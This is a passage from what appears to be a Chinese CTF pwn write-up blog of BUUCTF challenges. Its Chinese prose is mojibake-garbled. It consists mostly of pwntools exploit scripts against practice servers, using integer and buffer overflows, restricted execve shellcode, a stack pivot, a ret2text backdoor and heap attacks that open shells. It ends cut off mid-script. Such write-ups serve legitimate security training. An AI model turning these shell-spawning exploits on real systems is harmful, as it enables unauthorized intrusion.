class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;your int type inode number :&#x27;</span>)<br>main_arena_low_4byte=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>])-<span class="hljs-number">96</span><br><span class="hljs-keyword">if</span> main_arena_low_4byte &lt; <span class="hljs-number">0</span>:<br>   main_arena_low_4byte += <span class="hljs-number">0x100000000</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;main_arena=&#x27;</span>+<span class="hljs-built_in">hex</span>(main_arena_low_4byte)<br>malloc_hook_low_4byte = (main_arena_low_4byte &amp; <span class="hljs-number">0xFFFFF000</span>) + (libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="hljs-number">0xFFF</span>)<br>libc_base_low_4byte=malloc_hook_low_4byte-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>stdin_filno_low_4byte=libc_base_low_4byte+libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]+<span class="hljs-number">0x70</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;libc_base_low_4byte=&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base_low_4byte)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;stdin_filno_low_4byte=&#x27;</span>+<span class="hljs-built_in">hex</span>(stdin_filno_low_4byte)<br>add(<span class="hljs-number">2</span>,stdin_filno_low_4byte&amp;<span class="hljs-number">0xffff</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">666</span>)<br>leave(<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-number-game">wustctf2020_number_game</h3><p>å‚è€ƒå¸ˆå‚…ï¼š[<a href="https://blog.csdn.net/mcmuyanga/article/details/114823490">BUUCTF]PWNâ€”â€”wustctf2020_number_game_mcmuyangaçš„åšå®¢-CSDNåšå®¢</a></p><p>è¿™é¢˜æœ‰æ„æ€ï¼Œæˆ‘ä»¬è¢«è¦æ±‚è¾“ä¸ªè´Ÿæ•°ï¼Œå–ååè¿˜è¦æ˜¯è´Ÿæ•°ï¼Œæ‰èƒ½å¼€shell</p><p>æˆ‘ä»¬è¾“å…¥æ•°æ®åä¼šè½¬æ¢æˆè¡¥ç ï¼ˆè´Ÿæ•°çš„è¡¥ç =åŸç å–å+1ï¼‰å­˜æ”¾åœ¨å†…å­˜ä¸­ï¼Œ32ä½intå‹è¡¨ç¤ºçš„èŒƒå›´æ˜¯<code>-2147483648~2147483647</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26350</span> )<br>r.sendline(<span class="hljs-string">&#x27;-2147483648&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="æŠ¤ç½‘æ¯-2018-gettingstart">æŠ¤ç½‘æ¯_2018_gettingstart</h3><p>ï¼ˆæµ®ç‚¹æ•°å†…å­˜è¡¨ç¤ºï¼‰</p><p>å‚è€ƒå¸ˆå‚…ï¼š<a href="https://www.yuque.com/u239977/cbzkn3/hp33wd">æŠ¤ç½‘æ¯_2018_gettingstartï¼ˆæµ®ç‚¹æ•°å†…å­˜è¡¨ç¤ºï¼‰ Â· è¯­é›€ (yuque.com)</a></p><p>ä¸»è¦å°±æ˜¯doubleæ€ä¹ˆè½¬åŒ–åˆ°è®¡ç®—æœºé‡Œå­˜å‚¨çš„</p><p>ä¸€ä¸ªåœ¨çº¿è®¡ç®—ç½‘ç«™ï¼š</p><p><a href="http://www.binaryconvert.com/convert_double.html?decimal=048046049">Double (IEEE754 Double precision 64-bit) Converter (binaryconvert.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29374</span> )<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x7FFFFFFFFFFFFFFF</span>)+p64(<span class="hljs-number">0x3FB999999999999A</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="starctf-2019-babyshell">starctf_2019_babyshell</h3><p>ï¼ˆæœ‰é™åˆ¶çš„shellcodeï¼‰</p><p>å‚è€ƒå¸ˆå‚…ï¼š <a href="https://blog.csdn.net/Y_peak/article/details/115409705">BUUCTF-pwn]â€”â€”starctf_2019_babyshell_Y_peakçš„åšå®¢-CSDNåšå®¢_starctf_2019_babyshell</a></p><p>èƒ½ç»•è¿‡å¾ªç¯æ£€æŸ¥\x00</p><p>\x00Båé¢åŠ ä¸Šä¸€ä¸ªå­—ç¬¦ï¼Œ å¯¹åº”ä¸€ä¸ªæ±‡ç¼–è¯­å¥</p><p>\x00J\x00ä¹Ÿè¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25763</span> )<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>sc=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f  </span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    push rsp </span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    xor esi, esi               </span><br><span class="hljs-string">    xor edx, edx           </span><br><span class="hljs-string">    push 0x3b</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;\x00bb&#x27;</span>+sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-buffer-overflow-0">picoctf_2018_buffer overflow 0</h3><p>ssh-p 27306 <a href="mailto:CTFMan@node4.buuoj.cn">CTFMan@node4.buuoj.cn</a></p><p>è¿å…¥sshï¼Œè¾“å…¥å¯†ç guest</p><p>è¿™é‡Œçš„å‡½æ•°signal(11, sigsegv_handler);</p><p>å¦‚æœæ˜¯æ— æ•ˆçš„å†…å­˜å¼•ç”¨å°±æ‰§è¡Œsigsegv_handlerå‡½æ•°ï¼Œ</p><p>é‡Œé¢æ˜¯fprintf(stderr, â€œ%s\nâ€, flag)</p><p>ä»¥å­—ç¬¦ä¸²çš„å½¢å¼å‘é€flagåˆ°stderræµå½“ä¸­</p><p>stderrï¼šã€unixã€‘æ ‡å‡†è¾“å‡º(è®¾å¤‡)æ–‡ä»¶ï¼Œå¯¹åº”ç»ˆç«¯çš„å±å¹•ã€‚è¿›ç¨‹å°†ä»æ ‡å‡†è¾“å…¥æ–‡ä»¶ä¸­å¾—åˆ°è¾“å…¥æ•°æ®ï¼Œå°†æ­£å¸¸è¾“å‡º<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E8%BE%93%E5%87%BA/5885826">æ•°æ®è¾“å‡º</a>åˆ°æ ‡å‡†è¾“å‡ºæ–‡ä»¶ï¼Œè€Œå°†é”™è¯¯ä¿¡æ¯é€åˆ°æ ‡å‡†é”™è¯¯æ–‡ä»¶ä¸­ã€‚åœ¨Cä¸­ï¼Œç¨‹åºæ‰§è¡Œæ—¶ï¼Œä¸€ç›´å¤„äºå¼€å¯çŠ¶æ€ã€‚</p><p><a href="https://www.cnblogs.com/jing1617/p/8213840.html">Linuxå¸¸ç”¨ç³»ç»Ÿå‡½æ•° - tigerloveapple - åšå®¢å›­ (cnblogs.com)</a>ï¼š</p><p>getegid()ç”¨æ¥å–å¾—æ‰§è¡Œç›®å‰è¿›ç¨‹æœ‰æ•ˆç»„è¯†åˆ«ç . æœ‰æ•ˆçš„ç»„è¯†åˆ«ç ç”¨æ¥å†³å®šè¿›ç¨‹æ‰§è¡Œæ—¶ç»„çš„æƒé™.</p><p>è¿”å›å€¼ï¼šè¿”å›æœ‰æ•ˆçš„ç»„è¯†åˆ«ç .</p><p>getresgid() åˆ†åˆ«è·å–çœŸå®çš„,æœ‰æ•ˆçš„å’Œä¿å­˜è¿‡çš„ç»„æ ‡è¯†å·</p><p>è¿™é¢˜æˆ‘ä»¬</p><p>./vuln argv[1]</p><p>./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</p><p>å¤šè¾“å‡ ä¸ªaå°±ä¼šè¾“å‡ºflag</p><p>å‚è€ƒå¸ˆå‚…ï¼š<a href="https://www.jianshu.com/p/891debfabf32">picoctf_2018_buffer overflow 0ï¼ˆ7/100ï¼‰ - ç®€ä¹¦ (jianshu.com)</a></p><h3 id="BSidesCF-2019-Runit">[BSidesCF 2019]Runit</h3><p>ï¼ˆshellcodeï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./runit&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28642</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(shellcraft.sh())<br>sl(sc)<br>r.interactive()<br><br><br></code></pre></td></tr></table></figure><h3 id="wdb-2018-3rd-soEasy">wdb_2018_3rd_soEasy</h3><p>(æ ˆè¿ç§»)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./wdb_2018_3rd_soEasy&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29461</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------</span><br>leave_ret=<span class="hljs-number">0x08048478</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>ru(<span class="hljs-string">&#x27;Hei,give you a gift-&gt;0x&#x27;</span>)<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(shellcraft.sh())<br>stack=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(stack)<br>sl(<span class="hljs-string">&#x27;aaaa&#x27;</span>+sc.ljust(<span class="hljs-number">0x48</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)+p32(stack)+p32(leave_ret))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="suctf-2018-stack">suctf_2018_stack</h3><p>ï¼ˆæ ˆå¹³è¡¡ï¼‰</p><p>Ubuntu18è¦æ£€æŸ¥æ ˆå¹³è¡¡</p><p><a href="https://blog.csdn.net/qq_41560595/article/details/112161243">ret2textæ¶‰åŠåˆ°çš„å †æ ˆå¹³è¡¡é—®é¢˜_ä¸€è·¯å¼€èŠ±â—-â—çš„åšå®¢-CSDNåšå®¢</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./SUCTF_2018_stack&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25323</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------------------------------</span><br>backdoor=<span class="hljs-number">0x400676</span><br>sl(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(backdoor+<span class="hljs-number">1</span>))<br><span class="hljs-comment">#sl(&#x27;a&#x27;*0x20+&#x27;b&#x27;*8+p64(backdoor+2))</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>å®é™…æ“ä½œçš„è¯åŠ ä¸ªretå°±è¡Œï¼Œå¦‚æœæœ‰é™åˆ¶ï¼Œæ— è„‘çš„åšæ³•åŠ å‡å‡ ä¸ªæ•°è¯•è¯•</p><h3 id="hitcontraining-unlink">hitcontraining_unlink</h3><h4 id="fastbin-attackï¼š">fastbin attackï¼š</h4><p>ä¿®æ”¹fdä¸bkï¼Œç”¨choice5ï¼Œåˆ©ç”¨åé—¨å‡½æ•°</p><p>è¿˜æ˜¯ä¸æ˜ç™½æ³¨é‡Šé‚£é‡Œä¸ºå•¥ä¼šæ”¹åˆ°bk</p><p>å‚è€ƒå¸ˆå‚…ï¼š[<a href="https://blog.csdn.net/mcmuyanga/article/details/113105091">BUUCTF]PWNâ€”â€”hitcontraining_unlink_mcmuyangaçš„åšå®¢-CSDNåšå®¢</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./bamboobox&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>    libc = ELF(remote_libc)<br><br>elf = ELF(local_file)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>  